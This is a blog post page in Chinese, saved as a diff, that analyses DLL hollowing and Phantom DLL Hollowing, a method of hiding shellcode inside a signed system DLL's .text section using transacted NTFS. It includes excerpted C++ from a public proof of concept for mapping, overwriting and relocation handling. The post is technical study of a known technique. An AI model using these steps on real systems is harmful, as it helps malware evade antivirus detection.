@@ -1,0 +1,469 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"ka1t4v.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="DLL镂空(dll hollowing)也是一种shellcode注入技术，原理和思路与process hollowing类似，通过合法的模块信息来伪装恶意代码">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Phantom DLL Hollowing技术">
+<meta property="og:url" content="https://ka1t4v.github.io/2023/04/12/%E5%B9%BB%E5%BD%B1DLL%E9%95%82%E7%A9%BA%E6%8A%80%E6%9C%AF/index.html">
+<meta property="og:site_name" content="Ka1t4v">
+<meta property="og:description" content="DLL镂空(dll hollowing)也是一种shellcode注入技术，原理和思路与process hollowing类似，通过合法的模块信息来伪装恶意代码">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/blogimg/c1d8f6_ff8edef7c79b48c2bbfbd29de97fa5b8mv2.webp">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/blogimg/c1d8f6_672e60de1c304fde8580ec4424af0236mv2.webp">
+<meta property="article:published_time" content="2023-04-12T05:16:01.000Z">
+<meta property="article:modified_time" content="2023-04-18T09:36:15.147Z">
+<meta property="article:author" content="Ka1t4v">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/blogimg/c1d8f6_ff8edef7c79b48c2bbfbd29de97fa5b8mv2.webp">
+
+<link rel="canonical" href="https://ka1t4v.github.io/2023/04/12/%E5%B9%BB%E5%BD%B1DLL%E9%95%82%E7%A9%BA%E6%8A%80%E6%9C%AF/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>Phantom DLL Hollowing技术 | Ka1t4v</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Ka1t4v</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://ka1t4v.github.io/2023/04/12/%E5%B9%BB%E5%BD%B1DLL%E9%95%82%E7%A9%BA%E6%8A%80%E6%9C%AF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/config/avatar.jpg">
+      <meta itemprop="name" content="Ka1t4v">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ka1t4v">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Phantom DLL Hollowing技术
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-04-12 13:16:01" itemprop="dateCreated datePublished" datetime="2023-04-12T13:16:01+08:00">2023-04-12</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ReadTeam/" itemprop="url" rel="index"><span itemprop="name">ReadTeam</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>DLL镂空(dll hollowing)也是一种shellcode注入技术，原理和思路与process hollowing类似，通过合法的模块信息来伪装恶意代码</p>
+<span id="more"></span>
+<p>虽然我们可以用远程dll注入来完整注入整个恶意dll，但此类注入往往比较容易检测，我们需要往受害者主机上传入一个恶意dll，这样杀毒软件可以通过监控入windows/temp/等目录实现对远程dll注入的拦截，而模块镂空就不会存在这样的风险，因为我们镂空的往往是一个带有微软签名的dll，为了防止进程出错，我们并不能直接镂空一个进程空间中已存在的dll，需要先对目标进程远程注入一个系统合法dll，然后再镂空它，这样我们就获得了一个和windows模块相关联的shellcode环境</p>
+<p>DLL镂空的流程</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.远程注入一个系统dll(原理参考CreateRemoteThrea的dll注入)</span><br><span class="line">2.获取该模块在目标进程中的虚拟地址</span><br><span class="line">3.定位模块的入口点</span><br><span class="line">4.使用shellcode复写入口点</span><br><span class="line">5.创建远程线程</span><br></pre></td></tr></table></figure>
+<p>在Forrest Orr的文章中，又提出了一个名为<a target="_blank" rel="noopener" href="https://www.forrest-orr.net/post/malicious-memory-artifacts-part-i-dll-hollowing">Phantom DLL Hollowing</a>的技术，并给出了<a target="_blank" rel="noopener" href="https://github.com/forrest-orr/phantom-dll-hollower-poc">github</a>源码，分析一下和普通DLL Hollowing的区别</p>
+<h2 id="DLL-Hollowing"><a class="header-anchor" href="#DLL-Hollowing">¶</a>DLL Hollowing</h2>
+<p>我们知道windows的内存类型可以分为三种：虚拟内存，映射内存，镜像内存，镜像内存具有RX权限的内存，并占很大一部分，因为一个PE文件的.text节需要RX权限来保证运行，所以说除了镜像内存，其他的虚拟内存和映射内存所含的RX的内存空间占比是很少的，所以为了隐藏，就需要将我们的恶意代码放在镜像内存中</p>
+<p><strong>但是不能直接分配这样的内存，也不能修改现有内存的属性来模仿镜像内存</strong>，我们能够修改的只有PTE结构，而VAD树等一些结构无法修改，那么只能通过从磁盘上真正加载的一个DLL，然后镂空.text节来利用其中的镜像内存，并且这个DLL需要有.text部分并且<code>IMAGE_SECTION_HEADER.Misc.VirtualSize</code>空间能够存储我们的shellcode，并且这个DLL也不能已经加载到进程当中，如果此时修改可能会导致进程崩溃</p>
+<p>搜索一个DLL，并判断是否已经被加载</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">GetSystemDirectoryW(SearchFilePath, MAX_PATH);</span><br><span class="line">wcscat_s(SearchFilePath, MAX_PATH, L&quot;\\*.dll&quot;);</span><br><span class="line"></span><br><span class="line">if ((hFind = FindFirstFileW(SearchFilePath, &amp;Wfd)) != INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">    do &#123;</span><br><span class="line">	if (GetModuleHandleW(Wfd.cFileName) == nullptr) &#123;</span><br><span class="line">            ...</span><br><span class="line">	&#125;</span><br><span class="line">   &#125;    </span><br><span class="line">   while (!bMapped &amp;&amp; FindNextFileW(hFind, &amp;Wfd));</span><br><span class="line">   FindClose(hFind);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>找到未加载的DLL后，将其文件内容读取到内存中，然后读取其<code>IMAGE_SECTION_HEADER.Misc.VirtualSize</code>查看大小是否满足</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">uint32_t dwFileSize = GetFileSize(hFile, nullptr);</span><br><span class="line">uint32_t dwBytesRead = 0;</span><br><span class="line"></span><br><span class="line">pFileBuf = new uint8_t[dwFileSize];</span><br><span class="line"></span><br><span class="line">if (ReadFile(hFile, pFileBuf, dwFileSize, (PDWORD)&amp; dwBytesRead, nullptr)) &#123;</span><br><span class="line">    SetFilePointer(hFile, 0, nullptr, FILE_BEGIN)</span><br><span class="line"></span><br><span class="line">    IMAGE_DOS_HEADER* pDosHdr = (IMAGE_DOS_HEADER*)pFileBuf;</span><br><span class="line">    IMAGE_NT_HEADERS* pNtHdrs = (IMAGE_NT_HEADERS*)(pFileBuf + pDosHdr-&gt;e_lfanew);</span><br><span class="line">    IMAGE_SECTION_HEADER* pSectHdrs = (IMAGE_SECTION_HEADER*)((uint8_t*)&amp; pNtHdrs-&gt;OptionalHeader + sizeof(IMAGE_OPTIONAL_HEADER));</span><br><span class="line"></span><br><span class="line">    if (pNtHdrs-&gt;OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR_MAGIC) &#123;</span><br><span class="line">        if (dwReqBufSize &lt; pNtHdrs-&gt;OptionalHeader.SizeOfImage &amp;&amp; (_stricmp((char*)pSectHdrs-&gt;Name, &quot;.text&quot;) == 0 &amp;&amp; dwReqBufSize &lt; pSectHdrs-&gt;Misc.VirtualSize))</span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>当找到合适的PE后，通过打开的文件句柄创建一个内存段，然后将其映射到本地进程空间</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HANDLE hSection = nullptr;</span><br><span class="line">NtStatus = NtCreateSection(&amp;hSection, SECTION_ALL_ACCESS, nullptr, nullptr, PAGE_READONLY, SEC_IMAGE, hFile);</span><br><span class="line"></span><br><span class="line">if (NT_SUCCESS(NtStatus)) &#123;</span><br><span class="line">    *pqwMapBufSize = 0;</span><br><span class="line">    NtStatus = NtMapViewOfSection(hSection, GetCurrentProcess(), (void**)ppMapBuf, 0, 0, nullptr, (PSIZE_T)pqwMapBufSize, 1, 0, PAGE_READONLY);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在<code>NtCreateSection</code>时需要指定<code>SEC_IMAGE</code>，来以映射内存的方式创建，此时<code>NtCreateSection</code>会校验PE结构的合法性，如果失败就会返回错误<strong>0xc0000005</strong></p>
+<p>然后修改此时内存中的.text节，插入我们的shellcode</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">*ppMappedCode = *ppMapBuf + pSectHdrs-&gt;VirtualAddress + dwCodeRva;</span><br><span class="line"></span><br><span class="line">if (!bTxF) &#123;</span><br><span class="line"></span><br><span class="line">    uint32_t dwOldProtect = 0;</span><br><span class="line">    if (VirtualProtect(*ppMappedCode, dwReqBufSize, PAGE_READWRITE, (PDWORD)&amp; dwOldProtect)) &#123;</span><br><span class="line">	memcpy(*ppMappedCode, pCodeBuf, dwReqBufSize);</span><br><span class="line">	if (VirtualProtect(*ppMappedCode, dwReqBufSize, dwOldProtect, (PDWORD)&amp; dwOldProtect)) &#123;</span><br><span class="line">	    bMapped = true;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    bMapped = true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>通过这样加载到内存空间的DLL与使用NTDLL.DLL!LdrLoadDll加载到内存的DLL有一点区别</p>
+<ul>
+<li>重定向表被修复，但是导入表没有修复</li>
+<li>加载的DLL不会被记录在PEB_LDR的三个双向链表中</li>
+</ul>
+<h2 id="Phantom-hollowing"><a class="header-anchor" href="#Phantom-hollowing">¶</a>Phantom hollowing</h2>
+<p>上述的DLL镂空技术，在加载一个DLL后，需要将.text节的权限修改为RW然后写入shellcode再修改成RX来执行，有两个弊端</p>
+<ul>
+<li>使用<code>NTDLL.DLL!NtProtectVirtualMemory</code>来修改被加载的镜像内存权限（敏感的函数调用）</li>
+<li>重写后的镜像内存将会在当前进程内存空间创建一个私有的视图</li>
+</ul>
+<p>第二点可以这样理解，比如通过NtCreateSection创建一个DLL的共享的内存段，进程会使用NtMapViewOfSection来将其映射到自己的私有内存空间，就像kernel32.dll，在物理内存中只会创建一个段来存储，每个进程通过NtMapViewOfSection将其映射到自己的内存空间，<strong>但是如果此时将映射的共享视图进行修改，此时视图的共享属性将被变成私有属性</strong>，即我们如果将DLL中的.text节修改后，其内存的属性从share变为private，将是一个明显的特征</p>
+<p>修改.text段前的dll内存分布</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/blogimg/c1d8f6_ff8edef7c79b48c2bbfbd29de97fa5b8mv2.webp" alt="c1d8f6_ff8edef7c79b48c2bbfbd29de97fa5b8~mv2"></p>
+<p>修改后可以看到一页大小（4k）的内存被设置成了私有属性</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/blogimg/c1d8f6_672e60de1c304fde8580ec4424af0236mv2.webp" alt="c1d8f6_672e60de1c304fde8580ec4424af0236~mv2"></p>
+<p>并且无论修改多少大小，都会将4k的界面设置成私有属性（4k为一页内存的默认大小）</p>
+<p>针对这个弱点，解决的思路就是在NtMapViewOfSection函数之前，就将其.text段修改成shellcode，使用transacted NTFS (TxF)</p>
+<p>使用transacted NTFS的API打开一个文件句柄，此时修改文件内容，并不会真正影响到真实磁盘中的文件，并且这个文件句柄能够和常规文件句柄一样使用</p>
+<p>普通的DLL镂空调用流程：</p>
+<ul>
+<li>NTDLL.DLL!NtCreateSection通过文件句柄创建一个段，并且设置<strong>SEC_IMAGE</strong>标志</li>
+<li>然后使用NTDLL.DLL!NtMapViewOfSection映射到内存空间</li>
+</ul>
+<p>Phantom DLL 镂空打开一个TxF文件句柄，将其.text节修改后，在创建一个段，流程为：</p>
+<ul>
+<li>NtCreateTransaction</li>
+<li>CreateFileTransactedW</li>
+<li>memcpy将shellcode写入TxF文件对象</li>
+<li>NtCreateSection，并且设置<strong>SEC_IMAGE</strong>标志</li>
+<li>NtMapViewOfSection</li>
+</ul>
+<p>映射下的文件对象仍将指向磁盘上合法的 Microsoft 签名 DLL（未更改），但内存中的视图将包含隐藏在其具有 +RX 权限的 .text 部分中的 shellcode</p>
+<p>demo代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">NtStatus = NtCreateTransaction(&amp;hTransaction,</span><br><span class="line">    TRANSACTION_ALL_ACCESS,</span><br><span class="line">    &amp;ObjAttr,</span><br><span class="line">    nullptr,</span><br><span class="line">    nullptr,</span><br><span class="line">    0,</span><br><span class="line">    0,</span><br><span class="line">    0,</span><br><span class="line">    nullptr,</span><br><span class="line">    nullptr);</span><br><span class="line"></span><br><span class="line">hFile = CreateFileTransactedW(FilePath,</span><br><span class="line">    GENERIC_WRITE | GENERIC_READ, // The permission to write to the DLL on disk is required even though we technically aren&#x27;t doing this.</span><br><span class="line">    0,</span><br><span class="line">    nullptr,</span><br><span class="line">    OPEN_EXISTING,</span><br><span class="line">    FILE_ATTRIBUTE_NORMAL,</span><br><span class="line">    nullptr,</span><br><span class="line">    hTransaction,</span><br><span class="line">    nullptr,</span><br><span class="line">    nullptr);</span><br><span class="line">...</span><br><span class="line">memcpy(pFileBuf + pSectHdrs-&gt;PointerToRawData + dwCodeRva, pCodeBuf, dwReqBufSize);</span><br><span class="line"></span><br><span class="line">if (WriteFile(hFile, pFileBuf, dwFileSize, (PDWORD)&amp; dwBytesWritten, nullptr)) &#123;</span><br><span class="line">    HANDLE hSection = nullptr;</span><br><span class="line">    NtStatus = NtCreateSection(&amp;hSection, SECTION_ALL_ACCESS, nullptr, nullptr, PAGE_READONLY, SEC_IMAGE, hFile);</span><br><span class="line">    if (NT_SUCCESS(NtStatus)) &#123;</span><br><span class="line">        *pqwMapBufSize = 0;</span><br><span class="line">        NtStatus = NtMapViewOfSection(hSection, GetCurrentProcess(), (void**)ppMapBuf, 0, 0, nullptr, (PSIZE_T)pqwMapBufSize, 1, 0, PAGE_READONLY);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Phantom hollowing技术的缺点是：</p>
+<ul>
+<li>
+<p>即使我们没有真正写入磁盘文件，但是打开文件句柄时还是需要<strong>写权限</strong>，这在低权限状态下不可用（解决办法就是复制一份system32下的DLL到当前目录，然后以写权限打开）</p>
+</li>
+<li>
+<p>并且在修改文件的.text段时需要额外注意，因为我们修改的视图是存储在磁盘中的文件视图，而不是内存视图，因为文件对齐和内存对齐的值不一样，所以一些偏移量不同，我们修改的.text节是文件视图，而不是内存视图</p>
+<p>因为ASLR的存在，所以每次加载后的初始地址不一样，只能通过重定位表来修补，我们如果将shellcode写入了绝对地址的地方，因为加载时会对绝对地址进行修补，从而导致shellcode损坏，所以需要在写入shellcode时根据重定位表来定位不可写的绝对地址，除了重定位表，同样需要考虑导入表和导出表对应的地址，部分地址也会指向.text段，如果修改后，可能会造成<code>NTDLL.DLL!NtCreateSection</code>失败</p>
+</li>
+</ul>
+<p>作者解决重定位表的办法就是通过查找绝对地址间的空隙，将我们的shellcode插入到空隙当中，demo如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">bool CheckRelocRange(uint8_t* pRelocBuf, uint32_t dwRelocBufSize, uint32_t dwStartRVA, uint32_t dwEndRVA) &#123;</span><br><span class="line">    IMAGE_BASE_RELOCATION * pCurrentRelocBlock;</span><br><span class="line">    uint32_t dwRelocBufOffset, dwX;</span><br><span class="line">    bool bWithinRange = false;</span><br><span class="line"></span><br><span class="line">    for (pCurrentRelocBlock = (IMAGE_BASE_RELOCATION *)pRelocBuf, dwX = 0, dwRelocBufOffset = 0; pCurrentRelocBlock-&gt;SizeOfBlock; dwX++) &#123;</span><br><span class="line">        uint32_t dwNumBlocks = ((pCurrentRelocBlock-&gt;SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(uint16_t));</span><br><span class="line">        uint16_t *pwCurrentRelocEntry = (uint16_t*)((uint8_t*)pCurrentRelocBlock + sizeof(IMAGE_BASE_RELOCATION));</span><br><span class="line"></span><br><span class="line">        for (uint32_t dwY = 0; dwY &lt; dwNumBlocks; dwY++, pwCurrentRelocEntry++) &#123;</span><br><span class="line">#ifdef _WIN64</span><br><span class="line"></span><br><span class="line">#define RELOC_FLAG_ARCH_AGNOSTIC IMAGE_REL_BASED_DIR64</span><br><span class="line">#else</span><br><span class="line">#define RELOC_FLAG_ARCH_AGNOSTIC IMAGE_REL_BASED_HIGHLOW</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">            if (((*pwCurrentRelocEntry &gt;&gt; 12) &amp; RELOC_FLAG_ARCH_AGNOSTIC) == RELOC_FLAG_ARCH_AGNOSTIC) &#123;</span><br><span class="line">                uint32_t dwRelocEntryRefLocRva = (pCurrentRelocBlock-&gt;VirtualAddress + (*pwCurrentRelocEntry &amp; 0x0FFF));</span><br><span class="line">                if (dwRelocEntryRefLocRva &gt;= dwStartRVA &amp;&amp; dwRelocEntryRefLocRva &lt; dwEndRVA) &#123;</span><br><span class="line">                    bWithinRange = true;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        dwRelocBufOffset += pCurrentRelocBlock-&gt;SizeOfBlock;</span><br><span class="line">        pCurrentRelocBlock = (IMAGE_BASE_RELOCATION *)((uint8_t*)pCurrentRelocBlock + pCurrentRelocBlock-&gt;SizeOfBlock);</span><br><span class="line">    &#125;</span><br><span class="line">    return bWithinRange;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>同样对于前面提到的导入导出表的问题，采取更简单粗暴的方式，即直接覆盖或清空</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">for (uint32_t dwX = 0; dwX &lt; pNtHdrs-&gt;OptionalHeader.NumberOfRvaAndSizes; dwX++) &#123;</span><br><span class="line">    if (pNtHdrs-&gt;OptionalHeader.DataDirectory[dwX].VirtualAddress &gt;= pSectHdrs-&gt;VirtualAddress &amp;&amp; pNtHdrs-&gt;OptionalHeader.DataDirectory[dwX].VirtualAddress &lt; (pSectHdrs-&gt;VirtualAddress + pSectHdrs-&gt;Misc.VirtualSize)) &#123;</span><br><span class="line">        pNtHdrs-&gt;OptionalHeader.DataDirectory[dwX].VirtualAddress = 0;</span><br><span class="line">        pNtHdrs-&gt;OptionalHeader.DataDirectory[dwX].Size = 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/03/29/%E8%87%AA%E5%AE%9A%E4%B9%89%E5%A0%86%E6%A0%88shellcode%EF%BC%882%EF%BC%89/" rel="prev" title="基于堆栈跟踪规避的免杀学习（二）">
+      <i class="fa fa-chevron-left"></i> 基于堆栈跟踪规避的免杀学习（二）
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#DLL-Hollowing"><span class="nav-number">1.</span> <span class="nav-text">DLL Hollowing</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Phantom-hollowing"><span class="nav-number">2.</span> <span class="nav-text">Phantom hollowing</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Ka1t4v"
+      src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/config/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Ka1t4v</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">39</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/ka1t4v" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ka1t4v" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:ka1t4v@gmail.com" title="E-Mail → mailto:ka1t4v@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
